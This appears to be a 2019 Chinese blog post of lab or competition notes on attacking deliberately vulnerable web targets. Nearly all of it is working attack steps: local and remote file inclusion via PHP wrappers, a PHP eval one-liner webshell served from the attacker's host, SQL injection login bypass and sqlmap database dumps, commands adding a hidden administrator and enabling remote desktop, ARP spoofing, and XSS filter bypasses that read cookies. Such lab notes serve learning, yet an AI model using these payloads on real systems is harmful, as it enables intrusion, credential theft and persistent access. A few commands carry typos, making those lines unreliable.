<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="安全部分@toc 一、文件包含[^ip]1.用pc机访问SDC中的file include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag.txt文件，并对URL及flag进行截图点击file Include，进入文件包含页面，点击任意一个链接，可以从URL地址可以得知通过变量page来调用包含子页面更改page的值为c:/flag.txt（文件路径）回车后可显示flag文件中的内容">
<meta property="og:type" content="article">
<meta property="og:title" content="Blog">
<meta property="og:url" content="http://yoursite.com/2019/09/07/安全/index.html">
<meta property="og:site_name" content="Blog">
<meta property="og:description" content="安全部分@toc 一、文件包含[^ip]1.用pc机访问SDC中的file include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag.txt文件，并对URL及flag进行截图点击file Include，进入文件包含页面，点击任意一个链接，可以从URL地址可以得知通过变量page来调用包含子页面更改page的值为c:/flag.txt（文件路径）回车后可显示flag文件中的内容">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-09-19T03:28:39.594Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Blog">
<meta name="twitter:description" content="安全部分@toc 一、文件包含[^ip]1.用pc机访问SDC中的file include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag.txt文件，并对URL及flag进行截图点击file Include，进入文件包含页面，点击任意一个链接，可以从URL地址可以得知通过变量page来调用包含子页面更改page的值为c:/flag.txt（文件路径）回车后可显示flag文件中的内容">
  
    <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-安全" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/07/安全/" class="article-date">
  <time datetime="2019-09-07T06:28:38.085Z" itemprop="datePublished">2019-09-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="安全部分"><a href="#安全部分" class="headerlink" title="安全部分"></a>安全部分</h1><p>@toc</p>
<h2 id="一、文件包含-ip"><a href="#一、文件包含-ip" class="headerlink" title="一、文件包含[^ip]"></a>一、文件包含[^ip]</h2><h3 id="1-用pc机访问SDC中的file-include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag-txt文件，并对URL及flag进行截图"><a href="#1-用pc机访问SDC中的file-include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag-txt文件，并对URL及flag进行截图" class="headerlink" title="1.用pc机访问SDC中的file include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag.txt文件，并对URL及flag进行截图"></a>1.用pc机访问SDC中的file include，验证其存在本地文件包含漏洞，使页面包含C盘根目录下的flag.txt文件，并对URL及flag进行截图</h3><p>点击<code>file Include</code>，进入文件包含页面，点击任意一个链接，可以从<code>URL</code>地址可以得知通过变量<code>page</code>来调用包含子页面<br>更改<code>page</code>的值为<code>c:/flag.txt</code>（文件路径）回车后可显示<code>flag</code>文件中的内容<br>也可以使用<code>file</code>协议，将URL中的变量page的值变为<code>file:///c:/flag.txt</code></p>
<h3 id="2-通过php输入流找到并查看当前网站根目录下的flag文件（文件包含特殊字符）内容，并对URL及flag进行截图"><a href="#2-通过php输入流找到并查看当前网站根目录下的flag文件（文件包含特殊字符）内容，并对URL及flag进行截图" class="headerlink" title="2.通过php输入流找到并查看当前网站根目录下的flag文件（文件包含特殊字符）内容，并对URL及flag进行截图"></a>2.通过php输入流找到并查看当前网站根目录下的flag文件（文件包含特殊字符）内容，并对URL及flag进行截图</h3><ul>
<li><p>浏览器设置代理，打开抓包 <a href="Burpsuite使用方法：">^1</a></p>
</li>
<li><p>修改好后将page的值更改为<code>hph://input</code>，软件会拦截此次数据 </p>
</li>
<li><p>在数据包最后添加代码<code>&lt;?print_r(glob(‘../../*’));?&gt;</code></p>
</li>
<li><p>遍历当前路径文件，可以发现特殊符号的flag文件，记录下文件名</p>
</li>
<li><p>再次把URL中变量page的值改为<code>php://input</code>，在Burp中加入代码<code>&lt;?echo readfile(‘../../%dk#sjf@_123.txt’);?&gt;</code>来读取flag文件内容<br>_&lt;this isa flag14此处14为字符串长度，“this isa flag”为文件内容&gt;_</p>
<h3 id="3-利用php流读取藏在flag-php页面的flag值，并截图"><a href="#3-利用php流读取藏在flag-php页面的flag值，并截图" class="headerlink" title="3.利用php流读取藏在flag.php页面的flag值，并截图"></a>3.利用php流读取藏在flag.php页面的flag值，并截图</h3></li>
<li><p>将<code>URL</code>变量<code>page</code>值修改为<code>falg.php</code>提交可以发现没有<code>flag</code>值&lt;注意<code>burp</code>放行&gt;</p>
</li>
<li><p>考虑<code>flag</code>可能会隐藏在php源码中，可以将文件用<code>base64</code>编码<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，复制密文</p>
</li>
<li><p>得到编码后使用终端解码，输入命令<code>base64 -d</code>，然后粘贴，按<code>ctrl+D</code>就能显示源码，可以在源码中找到<code>flag</code>值</p>
<h3 id="4-利用php封装协议查看压缩文件中的zip-txt文件，并对URL截图"><a href="#4-利用php封装协议查看压缩文件中的zip-txt文件，并对URL截图" class="headerlink" title="4.利用php封装协议查看压缩文件中的zip.txt文件，并对URL截图"></a>4.利用php封装协议查看压缩文件中的zip.txt文件，并对URL截图</h3></li>
<li><p>在文件包含页面，把<code>URL</code>中<code>page</code>变量的值改为<code>phar://flag.zip/zip.txt</code>提交可以直接显示<code>flag</code>值&lt;找到<code>flag</code>的方法用<a href="#2-通过php输入流找到并查看当前网站根目录下的flag文件（文件包含特殊字符）内容，并对url及flag进行截图">遍历</a>目录的方法，此方法只适用于<code>.zip</code>文件&gt;</p>
<h3 id="5-利用远程文件包含漏洞向Windows服务器上写入名为exp-php的一句话木马，并对在pc机创建的文件内容以及远程包含时的url进行截图"><a href="#5-利用远程文件包含漏洞向Windows服务器上写入名为exp-php的一句话木马，并对在pc机创建的文件内容以及远程包含时的url进行截图" class="headerlink" title="5.利用远程文件包含漏洞向Windows服务器上写入名为exp.php的一句话木马，并对在pc机创建的文件内容以及远程包含时的url进行截图"></a>5.利用远程文件包含漏洞向Windows服务器上写入名为exp.php的一句话木马，并对在pc机创建的文件内容以及远程包含时的url进行截图</h3></li>
<li><p>在kali中打开终端，进入<code>/var/www/html</code>目录，创建<code>touch exp.php</code>一句话木马，并编辑一句话木马<code>vim exp.php</code>写入<code>&lt;?php @eval($_POST[ss]);?&gt;</code> </p>
</li>
<li><p>开启本地Web服务</p>
</li>
<li><p>在浏览器文件包含页面，把<code>page</code>值改为<code>http://192.168.175.129/exp.php</code>提交</p>
<h2 id="二、SQL注入"><a href="#二、SQL注入" class="headerlink" title="二、SQL注入"></a>二、SQL注入</h2><h3 id="1-通过伪造http头部信息，绕过对于IP地址的限制，获取flag，对flag经行截图"><a href="#1-通过伪造http头部信息，绕过对于IP地址的限制，获取flag，对flag经行截图" class="headerlink" title="1.通过伪造http头部信息，绕过对于IP地址的限制，获取flag，对flag经行截图"></a>1.通过伪造http头部信息，绕过对于IP地址的限制，获取flag，对flag经行截图</h3><p>cms</p>
</li>
<li><p>抓包，在包cookie上一行添加<code>X-Forwarded-for:1.1.1.1</code></p>
<h3 id="2-登录界面存在sql宽字节漏洞，尝试输入特殊字符，使页面报错，验证其存在sql注入，并对报错页面经行截图"><a href="#2-登录界面存在sql宽字节漏洞，尝试输入特殊字符，使页面报错，验证其存在sql注入，并对报错页面经行截图" class="headerlink" title="2.登录界面存在sql宽字节漏洞，尝试输入特殊字符，使页面报错，验证其存在sql注入，并对报错页面经行截图"></a>2.登录界面存在sql宽字节漏洞，尝试输入特殊字符，使页面报错，验证其存在sql注入，并对报错页面经行截图</h3><p>靶机地址</p>
</li>
<li><p><code>[http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1](http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1)</code></p>
</li>
<li><p><code>%df%27</code> 或者<code>%df’</code></p>
<h3 id="3-登陆页面存在任意密码登录，构造语句绕过服务器验证端，并对登录成功页面及语句进行截图"><a href="#3-登陆页面存在任意密码登录，构造语句绕过服务器验证端，并对登录成功页面及语句进行截图" class="headerlink" title="3.登陆页面存在任意密码登录，构造语句绕过服务器验证端，并对登录成功页面及语句进行截图"></a>3.登陆页面存在任意密码登录，构造语句绕过服务器验证端，并对登录成功页面及语句进行截图</h3></li>
<li><p>账号：<code>admin&#39;#</code> 密码：随意</p>
<h3 id="4-对登录页面经行sql注入测试，获取当前所在数据库的名称，flag格式为flag-当前数据库名"><a href="#4-对登录页面经行sql注入测试，获取当前所在数据库的名称，flag格式为flag-当前数据库名" class="headerlink" title="4.对登录页面经行sql注入测试，获取当前所在数据库的名称，flag格式为flag{当前数据库名}"></a>4.对登录页面经行sql注入测试，获取当前所在数据库的名称，flag格式为flag{当前数据库名}</h3></li>
<li><p>抓登录时<code>POST</code>包，将抓到的包删除<code>username</code>和<code>password</code>中间的参数</p>
</li>
<li><p>终端：<code>sqlmap -r post.txt --dbs</code></p>
<h3 id="5-对登录页面经行sql注入测试，获取藏在数据库中的flag值，flag格式为flag-获取到的flag值"><a href="#5-对登录页面经行sql注入测试，获取藏在数据库中的flag值，flag格式为flag-获取到的flag值" class="headerlink" title="5.对登录页面经行sql注入测试，获取藏在数据库中的flag值，flag格式为flag{获取到的flag值}"></a>5.对登录页面经行sql注入测试，获取藏在数据库中的flag值，flag格式为flag{获取到的flag值}</h3></li>
<li><p>终端：<code>sqlmap -r post.txt -D cms --table</code></p>
<h2 id="三、SQL-WebShell"><a href="#三、SQL-WebShell" class="headerlink" title="三、SQL+WebShell"></a>三、SQL+WebShell</h2><h3 id="1-PC机访问SDC中的web2018服务器的web页面，找到注入点并进行sql注入攻击，获取藏在数据库中的flag，并对结果进行截图"><a href="#1-PC机访问SDC中的web2018服务器的web页面，找到注入点并进行sql注入攻击，获取藏在数据库中的flag，并对结果进行截图" class="headerlink" title="1.PC机访问SDC中的web2018服务器的web页面，找到注入点并进行sql注入攻击，获取藏在数据库中的flag，并对结果进行截图"></a>1.PC机访问SDC中的web2018服务器的web页面，找到注入点并进行sql注入攻击，获取藏在数据库中的flag，并对结果进行截图</h3><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a><strong>手工注入</strong></h4></li>
<li><p>可以看看<code>url</code>包含的<code>/？x=x</code>的部分可能存在<code>sql</code>注入点。在url后加一个单引号测试，如果页面报错，就说明存在注入点</p>
</li>
<li><p>既然存在注入点，可以在URL后加入<code>and 1=1</code>，没有错误。改成<code>and 1=2</code> ，出现报错，说明<code>SQL</code>注入点是数字型</p>
</li>
<li><p>继续在url后加入<code>order by 1</code> 页面返回数据（没有报错），继续测试这个数据库有多少个字段，这里测试到15，有15个字段</p>
</li>
<li><p>将url后缀修改为 <code>and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</code>。可以查看页面中的字段是怎么分布的 _&lt;此处序号要写全，不然会出错&gt;_</p>
</li>
<li><p>查看数据库名称：将上面数字序号中任意一个修改成<code>database()</code></p>
</li>
<li><p>知道数据库名称后继续查询这个数据库中的表名：<code>union select 1,2,3,4,5,6,7,8,9,10,database(),12,13,group_concat(table_name),15 from information_schema.tables where table_schema=database()</code></p>
</li>
<li><p>估计flag就是用户信息表中数据，先爆破<code>cms_users</code>表中的字段名<br><code>union select 1,2,3,4,5,6,7,8,9,10,database(),12,13,group_concat(column_name),15 from information_schema.columns where table_name=&#39;cms_users&#39;</code></p>
</li>
<li><p>查看用户数据：发现有个用户就是<code>flag</code>：<br><code>union select 1,2,3,4,5,6,7,8,userid,10,database(),username,13,password,15 from cms_users%20 limit 5,6</code> limit 由2，3开始往后测试</p>
<h4 id="SQLMap注入"><a href="#SQLMap注入" class="headerlink" title="SQLMap注入"></a><strong>SQLMap注入</strong></h4><p>爆破数据库中有哪些数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;链接&quot; --dbs          #链接注入</span><br><span class="line">sqlmap -u &quot;完整路径&quot; --cookie &apos;根据拦截的包提出的cookie值&apos; --dbs    #cookie注入</span><br><span class="line">sqlmap -r 含有post的txt文件 --dbs &lt;注意删除user和passwd之间的参数&gt;   #post登录注入</span><br><span class="line">      不同注入只需要调整参数即可</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看需要数据库中的所有表名<br><code>sqlmap -u &quot;http://192.168.174.130/cms/show.php?id=38&quot; -D cms --tables</code><br>爆破cms_users表中所有字段信息</p>
</li>
<li><p><code>sqlmap -u &quot;http://192.168.174.130/cms/show.php?id=38&quot; -D cms -T cms_users --columns</code></p>
</li>
<li><p>爆破用户账号和密码<br><code>sqlmap -u &quot;http://192.168.174.130/cms/show.php?id=38&quot; -D cms -T cms_users -C username,password --dump</code></p>
</li>
<li><p>发现flag</p>
<h3 id="2-尝试找到网站的后台并登录，获取放在后台页面的flag值"><a href="#2-尝试找到网站的后台并登录，获取放在后台页面的flag值" class="headerlink" title="2.尝试找到网站的后台并登录，获取放在后台页面的flag值"></a>2.尝试找到网站的后台并登录，获取放在后台页面的flag值</h3></li>
<li><p>可以使用SQL注入绕过登录限制，用上一题的用户和密码登录后台</p>
<h3 id="3-寻找后台存在漏洞的上传点，编写一句话木马并绕过上传，利用一句话木马查看上传目录下的flag文件"><a href="#3-寻找后台存在漏洞的上传点，编写一句话木马并绕过上传，利用一句话木马查看上传目录下的flag文件" class="headerlink" title="3.寻找后台存在漏洞的上传点，编写一句话木马并绕过上传，利用一句话木马查看上传目录下的flag文件"></a>3.寻找后台存在漏洞的上传点，编写一句话木马并绕过上传，利用一句话木马查看上传目录下的flag文件</h3></li>
<li><p><em>KALI*</em></p>
</li>
<li><p>登录后台后，寻找能上传文件的位置</p>
</li>
<li><p>记录下上传后的文件路径</p>
</li>
<li><p>如果有上传限制可以抓包修改MIME类型</p>
</li>
<li><p>==改什么==</p>
</li>
<li><p><em>windows*</em></p>
</li>
<li><p>菜刀连接一句话马</p>
</li>
<li><p>右键添加url <em>#URL为木马在网页中的相对路径#</em></p>
</li>
<li><p>看到flag文件，打开看到flag值</p>
<h3 id="4-利用一句话木马进入服务器后，尝试找到藏在管理员用户开机自启的文件夹中的flag文件，并对结果经行截图"><a href="#4-利用一句话木马进入服务器后，尝试找到藏在管理员用户开机自启的文件夹中的flag文件，并对结果经行截图" class="headerlink" title="4.利用一句话木马进入服务器后，尝试找到藏在管理员用户开机自启的文件夹中的flag文件，并对结果经行截图"></a>4.利用一句话木马进入服务器后，尝试找到藏在管理员用户开机自启的文件夹中的flag文件，并对结果经行截图</h3></li>
<li><p>右键开始 –&gt; 启动</p>
<h3 id="5-该服务器上存在一个隐藏用户，尝试从注册表中找到这个用户，flag值为此用户的用户名，flag格式为flag-隐藏用户用户名-，并对其截图"><a href="#5-该服务器上存在一个隐藏用户，尝试从注册表中找到这个用户，flag值为此用户的用户名，flag格式为flag-隐藏用户用户名-，并对其截图" class="headerlink" title="5.该服务器上存在一个隐藏用户，尝试从注册表中找到这个用户，flag值为此用户的用户名，flag格式为flag{隐藏用户用户名}，并对其截图"></a>5.该服务器上存在一个隐藏用户，尝试从注册表中找到这个用户，flag值为此用户的用户名，flag格式为flag{隐藏用户用户名}，并对其截图</h3><ul>
<li>在菜刀中打开虚拟终端输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user admin 123456 /add   #创建用户</span><br><span class="line">net localgroup administrators admin /add   #将admin加入管理组</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1</span><br><span class="line">     #开启远程桌面</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h2 id="四、arp欺骗"><a href="#四、arp欺骗" class="headerlink" title="四、arp欺骗"></a>四、arp欺骗</h2><p><code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code></p>
<ul>
<li>选项：<br><code>-i interface</code>                指定要使用的接口。<br><code>-c own|host|both</code>      指定范围own|host|both（自己|主机|两者）。<br><code>-t target</code>                  指定一台特定主机为ARP中毒（如果未指定，则为LAN上的所有主机）。<br><code>host</code>                          指定您希望拦截数据包的主机（通常是本地网关）。</li>
</ul>
<p>使目标主机断网（同一局域网）</p>
<ul>
<li><code>arpspoof -i eth0 -t 192.168.靶机ip 192.168.(网关/防火墙网关)</code></li>
</ul>
<p>监控传输的流量（中间人）</p>
<ul>
<li>先开启kali liunx的路由转发功能<br><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></li>
</ul>
<h2 id="五、MAC泛洪"><a href="#五、MAC泛洪" class="headerlink" title="五、MAC泛洪"></a>五、MAC泛洪</h2><h2 id="六、XSS攻击"><a href="#六、XSS攻击" class="headerlink" title="六、XSS攻击"></a>六、XSS攻击</h2><h3 id="1-反射型-XSS"><a href="#1-反射型-XSS" class="headerlink" title="1.反射型 XSS"></a>1.反射型 XSS</h3><h4 id="1-Low-级别反射型-XSS-攻击实战"><a href="#1-Low-级别反射型-XSS-攻击实战" class="headerlink" title="(1)Low 级别反射型 XSS 攻击实战"></a>(1)Low 级别反射型 XSS 攻击实战</h4><ul>
<li>安全级别设置为 <code>Low</code>，点击 <code>XSS(Reflected)</code> 按钮，进入反射型 XSS 攻击模块</li>
<li>尝试提交弹窗脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，输出用户 cookie，可以直接成功，说明 <code>Low</code> 级别未做任何防护措施<h4 id="2-Medium-级别反射型-XSS-攻击实战"><a href="#2-Medium-级别反射型-XSS-攻击实战" class="headerlink" title="(2)Medium 级别反射型 XSS 攻击实战"></a>(2)Medium 级别反射型 XSS 攻击实战</h4></li>
<li>安全级别设置为 <code>Medium</code>，再次尝试直接提交输出 cookie 脚本，发现把脚本内容直接显示出来了，说明对敏感的 JS 脚本做了过滤或转义<br>查看页面源码，发现如下代码 <code>$name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，使用 <code>str_replace</code> 函数把提交内容中的 <code>&lt;script&gt;</code> 替换为了空值</li>
<li>考虑到 PHP 严格区分大小写字母，该替换函数只匹配的小写的 <code>script</code>，并没有匹配大写字母，尝试把 <code>script</code> 全部换成大写，提交 <code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code>，发现可以成功弹窗</li>
<li>该替换函数是对整个 <code>&lt;script&gt;</code> 字符做替换，而且只替换了一次，并没有做递归检查，尝试在 <code>&lt;script&gt;</code> 中再嵌套一个 <code>&lt;script&gt;</code>，提交 <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code>，也可以成功<h4 id="3-High-级别反射型-XSS-攻击实战"><a href="#3-High-级别反射型-XSS-攻击实战" class="headerlink" title="(3)High 级别反射型 XSS 攻击实战"></a>(3)High 级别反射型 XSS 攻击实战</h4></li>
<li>尝试前面的攻击方法，发现在 <code>High</code> 级别下都无法成功，查看页面源码，发现如下代码 <code>$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code> ，<code>preg_replace</code> 函数可以调用正则表达式。我们发现该替换函数使用正则表达式进行了 script 的逐字检查，并通过 <code>/i</code> 来不区分大小写，所在造成之前的方法都不管用</li>
<li>JS 脚本不仅仅可以在 <code>&lt;script&gt;</code> 标签中使用，通过 <code>&lt;img&gt;</code> 标签中 <code>onerror</code> 行为也可以调用 JS 脚本。提交 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，成功弹窗<h3 id="2-储存型-XSS"><a href="#2-储存型-XSS" class="headerlink" title="2. 储存型 XSS"></a>2. 储存型 XSS</h3><h4 id="1-Low-级别存储型-XSS-攻击实战"><a href="#1-Low-级别存储型-XSS-攻击实战" class="headerlink" title="(1) Low 级别存储型 XSS 攻击实战"></a>(1) Low 级别存储型 XSS 攻击实战</h4></li>
<li>安全级别设置为 <code>Low</code>，点击 <code>XSS (Stored)</code>，进入存储型 XSS 攻击页面。发现该页面是个留言板，随意输入留言内容，可以直接显示在当前页面</li>
<li>尝试在 Message 框提交弹窗脚本输出当前 cookie，<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ，可以直接弹窗。说明当前级别没有对攻击脚本做任何过滤和转义<h4 id="2-Medium-级别存储型-XSS-攻击实战"><a href="#2-Medium-级别存储型-XSS-攻击实战" class="headerlink" title="(2) Medium 级别存储型 XSS 攻击实战"></a>(2) Medium 级别存储型 XSS 攻击实战</h4></li>
<li>安全级别设置为 <code>Medium</code>，进入存储型 XSS 攻击页面，直接在 Message 框提交输出 cookie 脚本，发现脚本内容被显示，说明脚本被转义。</li>
<li>查看页面源码，发现对 Message 框提交的内容使用了 <code>htmlspecialchars</code> 函数，Message 框的 XSS 基本已不可能；但是我们发现对 Name 框提交的内容只是简单的使用 <code>str_replace</code> 函数进行了简单替换，与 <code>Medium</code> 反射型 XSS 一样。我们只需要更换大写字母，或者 <code>&lt;script&gt;</code> 中再嵌套一层 <code>&lt;script&gt;</code> 即可绕过防御<br>在 Message 框随意输入内容， Name 框输入脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，发现脚本无法完整输入，页面对 Name 框的字符长度进行了前端限制</li>
<li>由于只是在浏览器前端进行的字符长度限制，我们只需要在 Burpsuite 中修改数据包就可以轻松绕过限制。配置好 Burpsuite 和浏览器的代理，抓包后，修改 <code>txtName</code> 变量的值为脚本 <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code>（也可以把 script 转换为大写）。放行数据包后，可以成功提交，并弹窗输出 cookie<h4 id="3-High-级别存储型-XSS-攻击实战"><a href="#3-High-级别存储型-XSS-攻击实战" class="headerlink" title="(3) High 级别存储型 XSS 攻击实战"></a>(3) High 级别存储型 XSS 攻击实战</h4></li>
<li>设置安全级别为 <code>High</code>，进入存储型 XSS 攻击页面，查看页面源码，发现 Message 字段仍然使用了 <code>htmlspecialchars</code> 函数；而 Name 字段使用了与 <code>High</code> 级别反射型 XSS 攻击一样的防护方法，使用 <code>preg_replace</code> 函数调用正则表达式对 <code>script</code> 做逐字匹配，并使用 <code>/i</code> 来不区分大小写<ul>
<li><input disabled type="checkbox"> 方法与反射型 XSS 一致，不能使用 <code>&lt;script&gt;</code> 标签，但可以使用 <code>&lt;img&gt;</code> 标签。由于前端仍然有字符长度限制，所以仍需要使用 Burpsuite 来修改数据包。在 Burpsuite 中修改数据包中的 <code>txtName</code> 内容为 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>。放行数据包后成功弹出 <code>cookie</code><h3 id="3-DOM型-XSS"><a href="#3-DOM型-XSS" class="headerlink" title="3. DOM型 XSS"></a>3. DOM型 XSS</h3><h4 id="1-Low-级别-DOM-型-XSS-攻击实战"><a href="#1-Low-级别-DOM-型-XSS-攻击实战" class="headerlink" title="(1)Low 级别 DOM 型 XSS 攻击实战"></a>(1)Low 级别 DOM 型 XSS 攻击实战</h4></li>
</ul>
</li>
<li>设置安全级别为 <code>Low</code>，点击 <code>XSS(DOM)</code> 按钮，进入 DOM 型 XSS 攻击页面。发现是个选择框，随便选择一个选项，提交发现选择的参数会携带在 URL 中，说明页面提交方式为 GET。</li>
<li>在选择框附近点击右键选择 <code>查看网页源代码</code> ，发现选择框中的内容使用了 <code>document.write</code> 的方式来输出，说明页面的 XSS 方式为 DOM 型。</li>
<li>在 URL 后直接加入攻击脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，发现可以直接弹窗<h4 id="2-Medium-级别-DOM-型-XSS-攻击实战"><a href="#2-Medium-级别-DOM-型-XSS-攻击实战" class="headerlink" title="(2)Medium 级别 DOM 型 XSS 攻击实战"></a>(2)Medium 级别 DOM 型 XSS 攻击实战</h4></li>
<li>设置安全级别为 <code>Medium</code>，进入 DOM 型 XSS 攻击页面。查看页面源码，发现存在代码，如果发现提交的内容中含有 <code>&lt;script</code>，则替换为 <code>English</code>，所以 <code>&lt;script&gt;</code> 标签无法使用。我们的思路与前面一样，使用 <code>&lt;img&gt;</code> 标签来进行攻击，在 URL 后加入 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，发现仍无法弹窗</li>
<li>使用浏览器的开发者工具查看前端源码，发现脚本内容被输出到了 <code>&lt;option&gt;</code> 标签的 <code>value</code> 值中，导致无法执行</li>
<li>根据上一步的发现，我们需要构造 <code>&lt;/option&gt;</code> 标签和 <code>&lt;/select&gt;</code> 标签来闭合语法，使脚本能够被执行，在 URL 后加入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，可以弹窗<h4 id="3-High-级别-DOM-型-XSS-攻击实战"><a href="#3-High-级别-DOM-型-XSS-攻击实战" class="headerlink" title="(3)High 级别 DOM 型 XSS 攻击实战"></a>(3)High 级别 DOM 型 XSS 攻击实战</h4></li>
<li>设置安全级别为 <code>High</code>，进入 DOM 型 XSS 攻击页面，查看页面源码，发现做了白名单过滤机制，提交的变量必须是 <code>French</code>、<code>English</code>、<code>German</code>、<code>Spanish</code> 中的一个，才允许提交，否则就会转换为空值。</li>
<li>考虑到 JS 是前端脚本，我们只需要在正常提交的值后用 # 把后面的攻击脚本注释掉，脚本内容就不会提交至服务器，也就可以通过白名单验证。但脚本仍然会在本地浏览器执行。在 URL 后加入如下脚本内容 <code>#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，注意 # 前有一个空格，可以弹窗</li>
</ul>
<p>   1.开启工具，切换到Proxy标签，点击Option选项，确认代理服务器的地址和端口，并且状态是勾选的。&lt;如果端口占用，就换一个端口&gt;<br>  2.切换到Intercept标签，确认代理功能是Intercept is ON<br>  3.设置浏览器的代理服务器，地址和端口就是Burpsuite中看到的地址和端口<br>  `<br>  注意事项：<br>  1.如果不想使用Burpsuite了，可以把代理功能点击按钮为 OFF 状态<br>  2.如果关闭了Burpsuite软件，记得关闭浏览器的代理，否则浏览器将无法访问任何网站<br>  打开Burpsuite ，开启代理，并在浏览器设置好代理<br>  Burpsuite设置<br>[^ip]: 攻击机IP：174.129<br>靶机IP：174.130</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/09/07/安全/" data-id="ck154mlpz0002p0tkb1d95763" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/09/18/无线/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/09/19/防火墙/">(no title)</a>
          </li>
        
          <li>
            <a href="/2019/09/18/无线/">(no title)</a>
          </li>
        
          <li>
            <a href="/2019/09/07/安全/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 晁誉<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>